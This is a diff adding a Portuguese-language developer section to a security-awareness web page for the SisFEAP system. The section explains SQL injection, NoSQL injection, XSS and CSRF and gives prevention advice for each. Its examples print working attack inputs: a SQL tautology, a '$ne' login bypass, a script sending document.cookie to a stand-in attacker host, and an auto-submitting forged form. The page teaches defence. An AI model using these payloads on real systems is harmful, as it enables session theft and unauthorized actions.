@@ -34,6 +34,7 @@
           <li><a href="#pilares">Pilares</a></li>
           <li><a href="#ameacas">Ameaças</a></li>
           <li><a href="#habitos">Hábitos</a></li>
+          <li><a href="#desenvolvimento">Dev</a></li>
         </ul>
       </nav>
     </div>
@@ -405,6 +406,104 @@
               <li>Mudou de função ou alguém saiu? Avise para ajustar os acessos</li>
             </ul>
           </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================== 6. DESENVOLVIMENTO ===================== -->
+    <section id="desenvolvimento" class="section section--white">
+      <div class="container">
+        <header class="section-header">
+          <p class="section-header__kicker">[05] Segurança também é responsabilidade de quem desenvolve</p>
+          <h2>O SisFEAP é software. Cada linha de código é uma porta.</h2>
+          <p>
+            As vulnerabilidades mais exploradas em sistemas web nascem quando o sistema
+            <strong>confia demais no que o usuário digita</strong>. Clique em cada uma para entender.
+          </p>
+        </header>
+
+        <div class="split split--wide">
+          <div class="dev-list">
+            <details class="dev-card">
+              <summary>SQL Injection</summary>
+              <div class="dev-card__body">
+                <p><strong>O que é:</strong> o atacante digita um trecho de SQL num campo do formulário, e o sistema o
+                  executa como parte da consulta ao banco.</p>
+                <p><strong>Exemplo vulnerável:</strong></p>
+                <pre><code>sql = "SELECT * FROM bolsistas WHERE cpf = '" + cpf + "'";
+// entrada maliciosa:  ' OR '1'='1
+// resultado: retorna TODOS os bolsistas</code></pre>
+                <p><strong>Como prevenir:</strong> consultas parametrizadas (<em>prepared statements</em>), validação da
+                  entrada por lista do que é permitido, usuário do banco com o mínimo de permissões e mensagens de erro
+                  que não revelem detalhes do banco.</p>
+              </div>
+            </details>
+
+            <details class="dev-card">
+              <summary>NoSQL Injection</summary>
+              <div class="dev-card__body">
+                <p><strong>O que é:</strong> o mesmo princípio em bancos NoSQL (como MongoDB): o atacante envia
+                  operadores do banco no lugar de valores simples.</p>
+                <p><strong>Exemplo vulnerável:</strong></p>
+                <pre><code>db.usuarios.findOne({ login: req.body.login, senha: req.body.senha });
+// corpo enviado: { "login": "admin", "senha": { "$ne": null } }
+// "$ne: null" = "senha diferente de vazio" → login sem senha</code></pre>
+                <p><strong>Como prevenir:</strong> validar o tipo de cada campo (esperar texto, rejeitar objetos), usar
+                  validação de esquema, bloquear chaves iniciadas por <code>$</code> e nunca guardar senhas em texto
+                  puro (use hash com bcrypt ou Argon2).</p>
+              </div>
+            </details>
+
+            <details class="dev-card">
+              <summary>Cross-Site Scripting (XSS)</summary>
+              <div class="dev-card__body">
+                <p><strong>O que é:</strong> o atacante grava um script num campo (comentário, nome, parecer) e o
+                  sistema exibe esse conteúdo sem tratamento. O script roda no navegador de quem abrir a página.</p>
+                <p><strong>Exemplo vulnerável:</strong></p>
+                <pre><code>// parecer cadastrado pelo atacante:
+&lt;script&gt;fetch("https://atacante.example/?c=" + document.cookie)&lt;/script&gt;
+
+elemento.innerHTML = parecer; // exibe e EXECUTA o script</code></pre>
+                <p><strong>Como prevenir:</strong> codificar a saída conforme o contexto (HTML, atributo, URL), usar
+                  <code>textContent</code> em vez de <code>innerHTML</code>, aplicar <em>Content Security Policy</em> e
+                  marcar cookies de sessão como <code>HttpOnly</code>.
+                </p>
+              </div>
+            </details>
+
+            <details class="dev-card">
+              <summary>Cross-Site Request Forgery (CSRF)</summary>
+              <div class="dev-card__body">
+                <p><strong>O que é:</strong> com você logado no SisFEAP, uma página maliciosa faz seu navegador enviar
+                  uma requisição ao sistema, que a aceita, porque o cookie da sua sessão vai junto.</p>
+                <p><strong>Exemplo:</strong></p>
+                <pre><code>&lt;!-- página do atacante, aberta por um link qualquer --&gt;
+&lt;form action="https://erp.sisfeap.example/repasses/aprovar" method="POST"&gt;
+  &lt;input type="hidden" name="repasse" value="9876"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+                <p><strong>Como prevenir:</strong> token anti-CSRF em cada formulário, cookies com
+                  <code>SameSite</code>, conferência dos cabeçalhos <code>Origin</code>/<code>Referer</code>, nova
+                  autenticação para ações críticas e nunca usar <code>GET</code> para alterar dados.
+                </p>
+              </div>
+            </details>
+          </div>
+
+          <aside class="dev-aside">
+            <figure class="framed-image framed-image--small">
+              <img src="assets/images/codigo.jpg" alt="Monitor exibindo código-fonte em um ambiente de desenvolvimento">
+            </figure>
+            <h3 class="subheading">Desenvolvimento seguro na prática</h3>
+            <ul class="check-list">
+              <li>Revisão de código com olhar de segurança</li>
+              <li>Análise estática (SAST) e dinâmica (DAST) no processo de entrega</li>
+              <li>Testes de invasão antes de grandes versões</li>
+              <li>Bibliotecas e dependências sempre atualizadas</li>
+              <li>Senhas e chaves fora do código-fonte</li>
+              <li>OWASP Top 10 como referência da equipe</li>
+            </ul>
+          </aside>
         </div>
       </div>
     </section>
